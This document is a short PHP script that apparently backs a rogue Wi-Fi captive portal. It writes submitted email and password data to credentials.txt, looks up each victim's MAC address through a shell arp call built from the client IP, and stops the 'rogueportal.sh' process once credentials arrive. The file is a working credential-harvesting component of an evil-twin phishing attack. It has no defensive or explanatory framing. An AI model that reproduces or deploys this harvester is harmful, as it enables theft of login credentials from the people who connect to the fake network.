<?php

$pid = "$PID";
$type = $_POST['type'];
$email = $_POST['email'];
$password = $_POST['password'];

file_put_contents('credentials.txt', file_get_contents('php://input'), FILE_APPEND);
file_put_contents('credentials.txt', "\n", FILE_APPEND);

$ip = $_SERVER['REMOTE_ADDR'];
$mac = shell_exec('sudo -u www-data /usr/sbin/arp -an ' . $ip);
preg_match('/..:..:..:..:..:../', $mac, $matches);
$arp = @$matches[0];

if (!file_exists('credentials.txt')) {
    header('Location: ' . $_SERVER['HTTP_REFERER']);
}

shell_exec("sudo killall -SIGINT -g rogueportal.sh");

?>
